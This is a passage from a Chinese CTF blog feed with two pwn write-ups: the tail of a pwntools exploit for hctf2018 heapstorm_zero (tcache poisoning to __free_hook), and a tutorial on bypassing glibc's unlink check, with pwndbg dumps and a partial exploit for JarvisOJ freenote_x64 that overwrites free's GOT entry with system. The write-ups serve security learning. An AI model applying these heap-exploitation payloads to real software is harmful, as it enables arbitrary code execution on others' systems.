class="number">0xf8</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free 0 填充 tcache</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放 chunk 9 ，触发堆合并，形成 overlap chunk</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把剩下的 tcache 里面的 bin 消耗掉</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">8</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配一个chunk 此时 索引 1 的 chunk 指向 unsorted bin , leak</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'8'</span>)</span><br><span class="line"></span><br><span class="line">leak = puts(<span class="number">1</span>)</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x70</span></span><br><span class="line">info(<span class="string">"libc.address : "</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 chunk 8, 此时 索引为 9， 现在 索引 1， 9 指向同一个 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache 中为两个 一样的 chunk 链在了一起, 设这个 chunk 的名称为 A。</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0xe42ee</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 tcache中的第一个 A ，此时 A 还位于 tcache, 然后修改 A-&gt;fd 为 free_hook</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># 再次分配到 A</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 free_hook, 然后修改 free_hook 为 system</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发 free_hook</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>参考<br><a href="https://www.cnblogs.com/hac425/p/9993716.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9993716.html</a><br><a href="https://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/exp.py" target="_blank" rel="noopener">https://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/exp.py</a><br><a href="https://xz.aliyun.com/t/3253#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;off by null 是一个比较有意思的技术 下面通过 hctf2018 的 heapstrom_zero 实战一波。&lt;/p&gt;
&lt;p&gt;题目
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>unlink</title>
    <link href="https://nocbtm.github.io/2020/02/27/unlink/"/>
    <id>https://nocbtm.github.io/2020/02/27/unlink/</id>
    <published>2020-02-27T06:38:52.000Z</published>
    <updated>2020-04-08T14:04:21.111Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>unlink是在smallbin被释放的时候的一种操作，是将当前物理内存相邻的free chunk进行合并,简单的讲就是我们在free一个smallchunk的时候，如果它前面或者后面的chunk有空闲的，即in_use位为0时，就将前面或后面的chunk连在一起合成一个chunk;<br>smallbin的数据结构：prev_size,size,fd,bk;<br>因为smallbin被释放后是用双链串在一起的，这就使目前unlink操作时，有一定的检查机制，主要检查我们的双链是否是合法的；<br>主要检查fd,bk等指针：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);</span><br></pre></td></tr></table></figure></p><p>在双向链表中，所以有两个地方记录chunk的大小，所以检查一下其大小是否一致：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);</span><br></pre></td></tr></table></figure><p>unlink操作的简要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD)</span></span><br><span class="line">&#123;</span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span>(FD-&gt;bk != P || BK-&gt;fd !=p)</span><br><span class="line">    &#123;</span><br><span class="line">        malloc_printerr (check_action, <span class="string">"corrupted d..."</span>, P);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>实际上，我们还是有办法绕过unlink的检查，不过需要有一些条件：</p><ol><li>有一个指向heap内的指针；</li><li>存放这个指针的地址已知(一般这个地址(&amp;p)是全局变量)；</li><li>可以对这个指针进行多次写入；</li><li>然后我们想办法修改p的fd和p的bk分别为:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位</span></span><br><span class="line">p-&gt;fd = &amp;p - <span class="number">0x18</span>; <span class="comment">//fd</span></span><br><span class="line">p-&gt;bk = &amp;p - <span class="number">0x10</span>; <span class="comment">//bk</span></span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">p-&gt;fd = &amp;p - <span class="number">12</span>; <span class="comment">//fd</span></span><br><span class="line">p-&gt;bk = &amp;p - <span class="number">8</span>; <span class="comment">//bk</span></span><br></pre></td></tr></table></figure><p>这样我们就可以绕过(FD-&gt;bk != P || BK-&gt;fd !=p)检测了，当unlink的操作完了之后，我们得到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位</span></span><br><span class="line">p = &amp;p - <span class="number">0x18</span>；</span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">p = &amp;p - <span class="number">12</span>;</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>我们以JarvisOJ中的freenote_x64来具体演示一下绕过unlink的操作并且熟悉一下smallbin的结构；<br>这道题在add函数和edit函数中，真实malloc的size最小都是0x80，也就是我们申请的是smallbin,所以操作的也是samllbin；<br>主要漏洞在delete note里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+Ch] [bp-4h]@2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( chunk_list-&gt;number &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No posts yet."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Post number: "</span>);</span><br><span class="line">    i = get_num();</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="number">0</span> &amp;&amp; i &lt; chunk_list-&gt;sum )        <span class="comment">// 未检查inuse位，double_free</span></span><br><span class="line">    &#123;</span><br><span class="line">      --chunk_list-&gt;number;</span><br><span class="line">      chunk_list-&gt;block[i].in_use = <span class="number">0L</span>L;</span><br><span class="line">      chunk_list-&gt;block[i].len = <span class="number">0L</span>L;</span><br><span class="line">      <span class="built_in">free</span>(chunk_list-&gt;block[i].ptr);           <span class="comment">// 指针未清空</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid number!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个有用的漏洞就是add和edit时，我们输入的字符串没有‘\x00’结尾符，我们输入多大的size就读多少size的字符，没有多余；</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>所以基本思路就是我们先申请4个chunk，然后free(0)和free(2)，防止合并；然后在申请2个chunk，只写入8字节，就可以leak出heap和libc的基地址;<br>在heap基地址偏移0x30的地方有我们需要的&amp;p:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603000</span><br><span class="line">0x603000:0x0000000000000000 0x0000000000001821</span><br><span class="line">0x603010:0x0000000000000100 0x0000000000000004</span><br><span class="line">0x603020:0x0000000000000001 0x0000000000000004</span><br><span class="line">0x603030:&amp;p0x0000000000604830 p 0x0000000000000001</span><br><span class="line">0x603040:0x0000000000000002 0x00000000006048c0</span><br><span class="line">0x603050:0x0000000000000001 0x0000000000000001</span><br><span class="line">0x603060:0x0000000000604950 0x0000000000000001</span><br><span class="line">0x603070:0x0000000000000004 0x00000000006049e0</span><br><span class="line">0x603080:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603090:0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>有了&amp;p之后我们就可以构造chunk，然后unlink了；<br>unlink之后的&amp;p,此时p=&amp;p-0x18:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603000</span><br><span class="line">0x603000:0x0000000000000000 0x0000000000001821</span><br><span class="line">0x603010:0x0000000000000100 0x0000000000000004</span><br><span class="line">0x603020:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603030:0x0000000000603018 p 0x0000000000000001 //p=&amp;p-0x18</span><br><span class="line">0x603040:0x0000000000000008 0x00000000006048c0</span><br><span class="line">0x603050:0x0000000000000001 0x0000000000000001</span><br><span class="line">0x603060:0x0000000000604950 0x0000000000000001</span><br><span class="line">0x603070:0x0000000000000004 0x00000000006049e0</span><br><span class="line">0x603080:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603090:0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>然后现在我们就可以修改0x0603018地址开始的内容了，然后就可以修改指针达到任意地址写入了；</p><h3 id="具体思路"><a href="#具体思路" class="headerlink" title="具体思路"></a>具体思路</h3><p>伪造的如下三个堆块结构 ，注意chunk前后的size一定要相对应<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80xg 0x17b8820</span><br><span class="line">0x17b8820:0x00000000000000000x0000000000000191</span><br><span class="line">0x17b8830:0x00000000000000900x0000000000000081</span><br><span class="line">0x17b8840:0x00000000017b70180x00000000017b7020</span><br><span class="line">0x17b8850:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8860:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8870:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8880:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8890:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b88a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b88b0:0x00000000000000800x0000000000000090</span><br><span class="line">0x17b88c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88d0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8900:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8910:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8920:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8930:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8940:0x00000000000000900x0000000000000121</span><br><span class="line">0x17b8950:0x32323232323232320x00007f61721feb78</span><br><span class="line">0x17b8960:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8970:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8980:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8990:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89b0:0x63636363636363630x0000000000020651</span><br><span class="line">0x17b89c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89d0:0x00000000000001200x0000000000000090</span><br><span class="line">0x17b89e0:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b89f0:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a00:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a10:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a20:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a30:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a40:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a50:0x64646464646464640x6464646464646464</span><br></pre></td></tr></table></figure></p><p>free(1)之后，堆块的结构<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80xg 0x11dd820</span><br><span class="line">0x11dd820:0x00000000000000000x0000000000000191</span><br><span class="line">0x11dd830:0x00000000000000900x0000000000000111</span><br><span class="line">0x11dd840:0x00007fc6bdb86b780x00007fc6bdb86b78</span><br><span class="line">0x11dd850:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd860:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd870:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd880:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd890:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd8a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd8b0:0x00000000000000800x0000000000000090</span><br><span class="line">0x11dd8c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8d0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd900:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd910:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd920:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd930:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd940:0x00000000000001100x0000000000000120</span><br><span class="line">0x11dd950:0x32323232323232320x00007fc6bdb86b78</span><br><span class="line">0x11dd960:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd970:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd980:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd990:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9b0:0x63636363636363630x0000000000020651</span><br><span class="line">0x11dd9c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9d0:0x00000000000001200x0000000000000090</span><br><span class="line">0x11dd9e0:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dd9f0:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda00:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda10:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda20:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda30:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda40:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda50:0x64646464646464640x6464646464646464</span><br></pre></td></tr></table></figure></p><p>而目标地址已经被修改为 p=&amp;p-0x18<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40xg 0x11dc000</span><br><span class="line">0x11dc000:0x00000000000000000x0000000000001821</span><br><span class="line">0x11dc010:0x00000000000001000x0000000000000000</span><br><span class="line">0x11dc020:0x00000000000000010x0000000000000120</span><br><span class="line">0x11dc030:0x00000000011dc0180x0000000000000000  //p=&amp;p-0x18</span><br><span class="line">0x11dc040:0x00000000000000000x00000000011dd8c0</span><br><span class="line">0x11dc050:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc060:0x00000000011dd9500x0000000000000000</span><br><span class="line">0x11dc070:0x00000000000000000x00000000011dd9e0</span><br><span class="line">0x11dc080:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc090:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc100:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc110:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc120:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc130:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>接下来向 chunk0 里面写内容就相当于控制了chunk list，随便修改东西，这里把free_got覆盖为system</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./freenote_x64'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29050</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./freenote_x64'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">List</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Length of new note: '</span>)</span><br><span class="line">p.sendline(str(len(cont)))</span><br><span class="line">p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">p.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'Length of note: '</span>)</span><br><span class="line">p.sendline(str(len(cont)))</span><br><span class="line">p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">p.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">new(<span class="string">'a'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'b'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'c'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'d'</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="string">'11111111'</span>)</span><br><span class="line">new(<span class="string">'22222222'</span>)</span><br><span class="line">List()</span><br><span class="line">p.recvuntil(<span class="string">'11111111'</span>)</span><br><span class="line">s=p.recvuntil(<span class="string">'\x0a'</span>)</span><br><span class="line">chunk2=u64(s[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_addr=chunk2<span class="number">-0x1940</span></span><br><span class="line">point_chunk0=heap_addr+<span class="number">0x30</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">payload = p64(<span class="number">0x90</span>)+p64(<span class="number">0x81</span>)+p64(point_chunk0<span class="number">-0x18</span>)+p64(point_chunk0<span class="number">-0x10</span>) </span><br><span class="line">payload +=<span class="string">'a'</span>*<span class="number">0x60</span></span><br><span class="line">payload += p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">payload +=<span class="string">'c'</span>*<span class="number">0x80</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x121</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#free_got-&gt;system</span></span><br><span class="line">free_got_addr=e.got[<span class="string">'free'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(free_got_addr)</span><br><span class="line">payload2=p64(<span class="number">4</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(free_got_addr)</span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(chunk2)</span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span 